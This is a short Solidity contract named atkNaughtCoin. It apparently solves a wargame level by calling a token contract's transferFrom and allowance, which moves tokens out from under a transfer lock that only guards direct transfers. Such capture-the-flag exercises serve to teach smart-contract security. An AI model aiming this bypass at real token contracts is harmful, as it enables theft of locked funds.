// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface NaughtCoin  {
	function transferFrom(address from, address to,  uint256 amount) external  returns (bool) ;
  function allowance(address owner, address spender) external view  returns (uint256);
}

contract atkNaughtCoin {

  NaughtCoin public target;

  constructor(address _target ) {

    target = NaughtCoin(_target);

  }


  function callTransferForm(address _from, address _to, uint256 _amount)  external  { 
        target.transferFrom(_from,_to,_amount);

    }

  function callAllowance(address _owner ) external view returns(uint256){
      return  target.allowance(_owner,address(this));
    }
}